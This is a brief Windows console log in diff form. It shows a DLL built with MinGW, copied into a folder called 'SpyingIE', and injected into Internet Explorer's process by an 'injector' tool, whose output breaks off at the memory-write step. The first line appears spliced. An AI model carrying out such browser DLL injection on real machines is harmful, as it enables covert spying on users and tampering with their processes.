@@ -1,0 +1,31 @@
+E:\>temp\C:\MinGW\bin>mingw32-gcc-4.6.2  -c dllmain.c -o dllmain.o
+cannot find *** missing mingw dll*** libraries
+
+copy dllmain.dll , *.* to C:\MingW\bin
+
+C:\MinGW\bin>mingw32-gcc-4.6.2  -c dllmain.c -o dllmain.o
+
+C:\MinGW\bin>dir/w *.o
+
+dllmain.o
+               1 File(s)          9,389 bytes
+               0 Dir(s)  15,668,129,792 bytes free
+
+
+C:\MinGW\bin>mingw32-gcc-4.6.2 -o dllmain.dll  -s -shared dllmain.o  -Wl,--subsystem,windows
+
+
+
+C:\MinGW\bin>dir/w *.dll
+
+dllmain.dll         
+
+
+C:\MinGW\bin>copy .\dllmain.dll C:\"Documents and Settings"\boon\Desktop\SpyingIE\*.*
+        1 file(s) copied.
+
+C:\Documents and Settings\boon\Desktop\SpyingIE>injector IEXPLORE.EXE dllmain.dll
+Pid is -> 2912
+-> Opening the target process...
+-> Memory Allocation...
+-> Writing DLL in memory...
